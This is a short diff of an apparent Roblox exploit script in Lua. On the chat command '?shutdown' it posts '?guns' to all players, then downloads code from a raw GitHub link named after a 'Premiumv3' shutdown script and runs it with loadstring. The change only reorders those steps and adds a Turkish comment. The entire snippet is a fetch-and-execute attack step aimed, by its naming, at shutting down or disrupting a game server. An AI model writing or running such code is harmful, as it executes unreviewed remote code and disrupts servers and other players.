@@ -4,8 +4,8 @@ local sayMessageRequest = replicatedStorage:WaitForChild("DefaultChatSystemChatE
 
 player.Chatted:Connect(function(message)
     if message == "?shutdown" then
-        wait(2)
-        sayMessageRequest:FireServer("?guns", "All")
+        sayMessageRequest:FireServer("?guns", "All") -- ?guns yaz
+        wait(1)
         local loadstringLink = "https://raw.githubusercontent.com/raisenscripts/Premiumv3/main/%3Fshutdown"
         loadstring(game:HttpGet(loadstringLink))()
     end
